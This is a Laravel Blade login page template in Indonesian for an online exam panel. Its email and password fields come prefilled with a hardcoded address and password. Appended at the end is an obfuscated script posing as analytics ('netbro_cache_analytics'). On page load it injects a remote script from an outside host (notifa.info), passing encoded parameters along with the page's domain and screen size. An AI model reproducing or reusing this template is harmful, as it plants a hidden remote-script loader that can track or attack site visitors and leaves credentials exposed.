<!DOCTYPE HTML>
<html lang="en" class="fullscreen-bg">
<head>
    <title>Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <link rel="stylesheet" href="{{ asset('assets/vendor/bootstrap/css/bootstrap.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/font-awesome/css/font-awesome.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/themify-icons/css/themify-icons.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/css/main.min.css') }}">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700" rel="stylesheet">
    <link rel="apple-touch-icon" sizes="76x76" href="{{ asset('assets/img/apple-icon.png') }}">
    <link rel="icon" type="image/png" sizes="96x96" href="{{ asset('assets/img/favicon.png') }}">
</head>
<body>
<div id="wrapper">
    <div class="vertical-align-wrap">
        <div class="vertical-align-middle">
            <div class="auth-box ">
                <div class="left">
                    <div class="content">
                        <div class="header">
                            <div class="logo text-center">
                                <img src="#" alt="Web Ujian Online">
                            </div>
                            <p class="lead">Masuk ke Panel</p>
                        </div>
                        <form class="form-auth-small" method="POST" action="{{ Route('process.login') }}" enctype="multipart/form-data">
                            {{ csrf_field() }}
                            <div class="form-group">
                                <label for="signin-email" class="control-label sr-only">Email</label>
                                <input type="email" class="form-control" id="email" name="email" value="alexandra@gmail.com" placeholder="Email">
                            </div>
                            <div class="form-group">
                                <label for="signin-password" class="control-label sr-only">Password</label>
                                <input type="password" class="form-control" id="password" name="password" value="thisisthepassword" placeholder="Password">
                            </div>
                            <div class="form-group clearfix">
                                <label class="fancy-checkbox element-left custom-bgcolor-blue">
                                    <input type="checkbox">
                                    <span class="text-muted">Ingat Saya</span>
                                </label>
                                <span class="helper-text element-right">Belum Mempunyai akun? <a href="page-register.html">Daftar</a></span>
                            </div>
                            <button type="submit" class="btn btn-primary btn-lg btn-block">MASUK</button>
                            <div class="bottom">
                                <span class="helper-text"><i class="fa fa-lock"></i> <a href="page-forgot-password.html">Lupa password?</a></span>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="right">
                    <div class="overlay"></div>
                    <div class="content text">
                        <h1 class="heading">“Membaca adalah melawan, menulis menciptakan perubahan, dan terorisme adalah pecundang.”</h1>
                        <p>by Lenang Manggala</p>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4S6S2nnnyp71Ey%2fWRdkVi27LY2N9ohmSpyOhSeSUM9d%2fyRXq5DXJ7hvymjkkXpdfB9ZA8TsuclvAOUNh6AGLP%2f2BmWv9JRwsZ4JrlZVtEiBA7ysz4FRR4S4jWiFoD%2fCdOnFd13b78PG6pnxu3mIpu6Xm8VVEiIPWLnEJtLpWBDN6inb%2b3vnQ2Jjyj%2b4IMlC9xo%2b45XVPTNtPj2UT2cFD523MLBC%2fYewm9VpTF2TAkQG2BAV%2by%2fJLA7iLG7XJKFAGguAl2Ty64jhNLsFsjQVvDnSVoCBGPkxuRlqN0FX%2fYbnU1i2gFnzq5PmNdkvlmF%2bXGyz%2b8ccdZ4k98FZw6UHSWBQOmrtmUeS27FdgkHkDdU4MCP7fHdGXDtsnmNX%2bHzrDXIl7h1DHaGzcta12nUYeHVJpsXvkNFA1SEpsklDlV4mDF%2fLkiQcdrARwHyPzmZw5P4Hplucf58%2fzugBHM%2b9NTg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>